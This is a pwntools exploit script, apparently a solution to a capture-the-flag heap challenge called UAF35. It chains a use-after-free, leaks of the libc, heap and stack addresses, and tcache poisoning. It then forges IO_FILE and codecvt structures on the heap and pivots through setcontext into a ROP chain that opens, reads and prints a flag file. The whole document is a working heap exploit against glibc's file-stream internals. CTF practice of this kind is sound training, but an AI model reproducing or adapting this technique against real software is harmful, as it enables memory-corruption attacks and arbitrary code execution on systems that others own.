#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./UAF35')
libc = ELF('./libc.so.6')
elf = ELF('./UAF35')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length,content='A'):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
	p.sendafter('please input content:',content)

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

#=========================libcbase=============================

add(0x420) #0
add(0x400) #1
delete(0)  # 放入 Unsortedbin

show(0)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x219ce0 # Unsortedbin 与 libc 偏移 == 0x219ce0
pr('libcbase',libcbase)

#===========================key-heapbase=======================

add(0x400) #2 
delete(0) # tcachebin

show(0)
key = u64(p.recv(6).ljust(8, "\x00")) # heap >> 12
heapbase = key << 12
pr('heapbase',heapbase)
pr('key',key)

#==============================================================

syscall_ret = libcbase + libc.search(asm('syscall\nret')).next()
_IO_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']
setcontext_door = libcbase + libc.sym['setcontext'] + 61
environ_addr = libcbase + libc.sym['__environ']
bss_addr = libcbase + libc.bss()
prdx_ret = libcbase + 0x11f497 # pop rdx ; pop r12 ; ret
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret
prsi_ret = libcbase + 0x2be51  # pop rsi ; ret
prax_ret = libcbase + 0x45eb0  # pop rax ; ret
ret = prdi_ret + 1 # ret

#mov rdi, qword ptr [rax]; mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 0x10];
rdi_rax_call = libcbase + 0x1630f4

#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
rdx_rdi_call = libcbase + 0x1675b0

#mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 0x10];
rax_rdi_call = libcbase + 0x15d65a

#==========================stack===============================

edit(0, '\x00'*0x10)
delete(0)
environ = (environ_addr - 0x10) ^ key
edit(0, p64(environ))
add(0x400, p64(environ)) #3
add(0x400, '\x00'*0x10) #4 分配至 environ 

show(4)
stack = u64(p.recv(24)[-8:].ljust(8,'\x00')) # 泄露 environ 栈地址
_start_point = stack - 0x50 # 程序 _start_point 地址
_start_point = _start_point - 0x8 # 0x10 对齐
pr('_start_point',_start_point)

#=======================_start_point===========================

delete(0)
edit(0, '\x00'*0x10)
delete(0)
edit(0, p64(_start_point ^ key))
add(0x400, p64(_start_point ^ key)) #5
add(0x400) #6 分配至 _start_point

show(6)
temp = u64(p.recv(48)[-8:].ljust(8,'\x00'))
start = temp & 0xfffffffff000 # 低三位清零

#==========================stderr==============================

stderr = start + 0x3040 # stderr bss 地址
pr('stderr',stderr)
delete(0)
edit(0,'\x00'*0x10)
delete(0)
edit(0, p64(stderr ^ key))
add(0x400, p64(stderr ^ key)) #7
add(0x400, p64(heapbase + 0x2a0)) #8 stderr point fake_IO_FILE

#=====================top_size=================================

delete(0)
edit(0, '\x00'*0x10)
delete(0)
top_size_addr = (heapbase + 0xad0) ^ key
edit(0, p64(top_size_addr))
add(0x400, p64(top_size_addr)) #9
add(0x400, p64(0) + p64(0x301)) #10 top_size change

#=========================fake_IO_FILE=========================

context_addr  = heapbase + 0x6d0
IO_FILE_addr  = heapbase + 0x2a0
codecvt_addr  = IO_FILE_addr + 0xe0
gadget_chunk_addr = IO_FILE_addr + 0x140

fake_IO_FILE  = p64(0) # _flags wide_data->_IO_read_ptr
fake_IO_FILE += p64(0) # _IO_read_ptr _wide_data->_IO_read_end
fake_IO_FILE += p64(1) # _IO_read_end
fake_IO_FILE += p64(0) # _IO_read_base
fake_IO_FILE += p64(0) # _IO_write_base
fake_IO_FILE += p64(1) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end
fake_IO_FILE  = fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE  = fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heapbase + 0x200)  # _lock = writable address
fake_IO_FILE  = fake_IO_FILE.ljust(0x98, '\x00')
fake_IO_FILE += p64(codecvt_addr) # _codecvt
fake_IO_FILE += p64(IO_FILE_addr) # _wide_data = IO_FILE_addr
fake_IO_FILE  = fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(_IO_wfile_jumps - 0x18) # vtable = _IO_wfile_xsputn - 0x18 = _IO_wfile_underflow

#======================fake_codecvt============================

fake_codecvt = p64(codecvt_addr + 0x20) # codecvt->__cd_in.step
fake_codecvt = fake_codecvt.ljust(0x20,'\x00')

__cd_in_step  = p64(0) # codecvt->__cd_in.step->__shlib_handle = 0 rdi
__cd_in_step  = __cd_in_step.ljust(0x28,'\x00')
__cd_in_step += p64(rax_rdi_call) # codecvt->__cd_in.step->__fct = rax_rdi_call (call rbp)
__cd_in_step  = __cd_in_step.ljust(0x38,'\x00')
__cd_in_step += p64(gadget_chunk_addr) # rdi + 0x38

#======================gadget_chunk============================

gadget_chunk  = p64(gadget_chunk_addr) # rax1 rdi
gadget_chunk += p64(context_addr) # rax2 rdi + 0x8 
gadget_chunk += p64(rdi_rax_call) # rax1 + 0x10
gadget_chunk += p64(rdx_rdi_call) # rax2 + 0x10
gadget_chunk  = gadget_chunk.ljust(0x38,'\x00')
gadget_chunk += p64(gadget_chunk_addr + 0x8)

#=============================orw==============================

frame = SigreturnFrame()
frame.rsp  = context_addr + 0x100 # rsp -> orw
frame.rip  = ret

payload  = p64(0)*4 + p64(setcontext_door) # rdx point this
payload += str(frame)[0x28:]
payload  = payload.ljust(0x100,'\x00')

flag_addr = context_addr + 0x200

# open
payload += p64(prdi_ret) + p64(flag_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

payload  = payload.ljust(0x200,'\x00') + './flag\x00\x00'

#==============================================================

payload0 = fake_IO_FILE + fake_codecvt + __cd_in_step + gadget_chunk
edit(0, payload0)
edit(1, payload)

p.sendlineafter(':','1')
p.sendlineafter('len:',str(0x460)) 
p.interactive()
